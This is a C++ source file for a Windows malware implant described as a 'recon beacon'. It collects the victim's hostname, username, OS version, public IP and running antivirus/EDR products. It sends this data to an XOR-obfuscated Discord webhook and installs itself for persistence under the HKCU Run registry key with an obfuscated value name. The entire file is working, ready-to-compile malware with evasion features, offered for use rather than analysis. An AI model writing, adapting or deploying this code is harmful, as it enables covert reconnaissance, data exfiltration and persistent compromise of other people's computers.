/*
 * check.cpp — Lightweight Recon Beacon → /check
 * Compile: x86_64-w64-mingw32-g++ -static -O2 -s -o check.exe check.cpp -lwinhttp -lwininet -ladvapi32 -mwindows
 *          (drop -mwindows if you want console for debugging)
 *
 * What it does:
 *   1. Grabs system fingerprint (hostname, user, OS, IP, AV check)
 *   2. POSTs JSON to your Discord webhook
 *   3. Sets registry persistence (HKCU Run)
 *   4. Exits clean — sub-second execution
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <cstdio>
#include <string>
#include <sstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// Runtime string XOR decryptor
inline std::wstring X(const wchar_t* enc, size_t len, wchar_t key) {
    std::wstring out(len, L'\0');
    for (size_t i = 0; i < len; i++) out[i] = enc[i] ^ key;
    return out;
}

// Encrypted webhook URL (XOR with 0x5A)
const wchar_t _wh[] = {
    0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,
    0x3E,0x33,0x29,0x39,0x35,0x28,0x3E,0x74,
    0x39,0x35,0x37,0x75,0x3B,0x2A,0x33,0x75,
    0x2D,0x3F,0x38,0x32,0x35,0x35,0x31,0x29,
    0x75,0x6B,0x6F,0x69,0x69,0x6A,0x6B,0x63,
    0x62,0x6A,0x6D,0x6C,0x68,0x6D,0x68,0x6B,
    0x6E,0x63,0x68,0x62,0x75,0x34,0x6B,0x1C,
    0x16,0x20,0x1F,0x09,0x0E,0x33,0x6B,0x18,
    0x32,0x20,0x19,0x6F,0x08,0x63,0x6A,0x35,
    0x31,0x62,0x0C,0x6D,0x3F,0x29,0x3B,0x68,
    0x08,0x3B,0x29,0x0B,0x20,0x15,0x1C,0x32,
    0x00,0x0C,0x16,0x35,0x1F,0x3F,0x1B,0x77,
    0x39,0x18,0x35,0x0F,0x09,0x18,0x68,0x1E,
    0x02,0x2F,0x35,0x38,0x16,0x32,0x32,0x0E,
    0x2F,0x2D,0x39,0x6E,0x34,0x6B,0x18,0x0B,
    0x3C,
    0x00};
#define SZ_WH 121

// Encrypted persistence name (XOR with 0x3C)
const wchar_t _pn[] = {
    0x6B,0x55,0x52,0x58,0x53,0x4B,0x4F,0x69,
    0x4C,0x58,0x5D,0x48,0x59,
    0x00};
#define SZ_PN 13

inline std::wstring WEBHOOK() { return X(_wh, SZ_WH, 0x5A); }
inline std::wstring PNAME()   { return X(_pn, SZ_PN, 0x3C); }

// --- WinHTTP GET helper ---
std::string HttpGet(const wchar_t* host, const wchar_t* path) {
    std::string result;
    HINTERNET hSess = WinHttpOpen(L"check/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return result;

    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return result; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return result; }

    if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(hReq, NULL)) {
        char buf[2048]; DWORD read = 0;
        while (WinHttpReadData(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = 0;
            result += buf;
        }
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return result;
}

// --- WinHTTP POST helper ---
bool HttpPost(const wchar_t* host, const wchar_t* path, const std::string& body) {
    HINTERNET hSess = WinHttpOpen(L"check/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return false;

    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return false; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return false; }

    LPCWSTR hdrs = L"Content-Type: application/json\r\n";
    bool ok = WinHttpSendRequest(hReq, hdrs, -1,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) WinHttpReceiveResponse(hReq, NULL);

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return ok;
}

// --- JSON string escape ---
std::string JsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"':  out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:   out += c;
        }
    }
    return out;
}

// --- System info gatherer ---
std::string GatherFingerprint() {
    // Hostname + User
    char host[256] = {}, user[256] = {};
    DWORD sz = sizeof(host); GetComputerNameA(host, &sz);
    sz = sizeof(user); GetUserNameA(user, &sz);

    // OS version
    std::string osVer = "Unknown";
    {
        HKEY hk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hk) == ERROR_SUCCESS) {
            char buf[128]; DWORD s = sizeof(buf);
            if (RegQueryValueExA(hk, "ProductName", NULL, NULL,
                (LPBYTE)buf, &s) == ERROR_SUCCESS) osVer = buf;
            RegCloseKey(hk);
        }
    }

    // Public IP
    std::string pubIp = HttpGet(L"api.ipify.org", L"/");
    if (pubIp.empty()) pubIp = "N/A";

    // AV / EDR check (quick process sniff)
    std::string avFound;
    {
        const wchar_t* avProcs[] = {
            L"MsMpEng.exe", L"avp.exe", L"bdagent.exe", L"NortonSecurity.exe",
            L"McAfeeEngine.exe", L"SACore.exe", L"csfalconservice.exe",
            L"SentinelAgent.exe", L"cb.exe", L"Cybereason.exe", NULL
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {sizeof(pe)};
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (int i = 0; avProcs[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, avProcs[i]) == 0) {
                            if (!avFound.empty()) avFound += ", ";
                            // Convert wide to narrow for the report string
                            char buf[256];
                            WideCharToMultiByte(CP_UTF8, 0, avProcs[i], -1, buf, sizeof(buf), NULL, NULL);
                            avFound += buf;
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    if (avFound.empty()) avFound = "None detected";

    std::ostringstream ss;
    ss << "Host: " << host << "\\n"
       << "User: " << user << "\\n"
       << "OS: " << osVer << "\\n"
       << "IP: " << pubIp << "\\n"
       << "AV/EDR: " << avFound;
    return ss.str();
}

// --- Persistence (HKCU Run) ---
void SetPersistence(const wchar_t* exePath) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExW(hk, PNAME().c_str(), 0, REG_SZ,
            (const BYTE*)exePath,
            (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

// --- Parse webhook URL into host+path ---
void ParseWebhookUrl(const wchar_t* url, std::wstring& host, std::wstring& path) {
    // https://discord.com/api/webhooks/ID/TOKEN
    std::wstring u(url);
    size_t start = u.find(L"://");
    if (start == std::wstring::npos) { host = url; path = L"/"; return; }
    start += 3;
    size_t slash = u.find(L'/', start);
    if (slash == std::wstring::npos) {
        host = u.substr(start);
        path = L"/";
    } else {
        host = u.substr(start, slash - start);
        path = u.substr(slash);
    }
}

// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Gather fingerprint
    std::string fp = GatherFingerprint();

    // 2. Build JSON embed
    std::string json = "{\"embeds\":[{\"title\":\"Check-in\","
        "\"description\":\"" + JsonEscape(fp) + "\","
        "\"color\":65280}]}";

    // 3. POST to webhook
    std::wstring host, path;
    ParseWebhookUrl(WEBHOOK().c_str(), host, path);
    HttpPost(host.c_str(), path.c_str(), json);

    // 4. Persistence
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    SetPersistence(selfPath);

    return 0;
}